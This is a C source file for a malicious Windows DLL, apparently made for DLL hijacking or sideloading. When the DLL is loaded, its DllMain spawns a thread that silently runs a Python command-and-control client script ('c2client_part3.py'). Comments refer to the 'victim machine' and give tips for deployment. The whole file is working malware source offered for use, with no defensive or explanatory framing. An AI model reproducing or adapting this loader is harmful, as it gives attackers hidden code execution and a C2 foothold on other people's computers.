#include <windows.h>

DWORD WINAPI ThreadProc(LPVOID lpParam) {
    // Command to be executed by WinExec
	//You'll want to edit this to make sure the path lines up with your installation of python on the victim machine
	//or better yet, compile this to an exe so you don't have to reference the python path :)
    WinExec("c:\\users\\robbi\\AppData\\Local\\Programs\\Python\\Python313\\python.exe c:\\users\\public\\c2client_part3.py", 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // Disable thread library calls to optimize performance
        DisableThreadLibraryCalls(hModule);

        // Create a new thread to run the command
        HANDLE hThread = CreateThread(
            NULL,       // default security attributes
            0,          // use default stack size
            ThreadProc, // thread function
            NULL,       // argument to thread function
            0,          // use default creation flags
            NULL);      // returns the thread identifier

        if (hThread) {
            // Close the thread handle as we don't need it anymore
            CloseHandle(hThread);
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
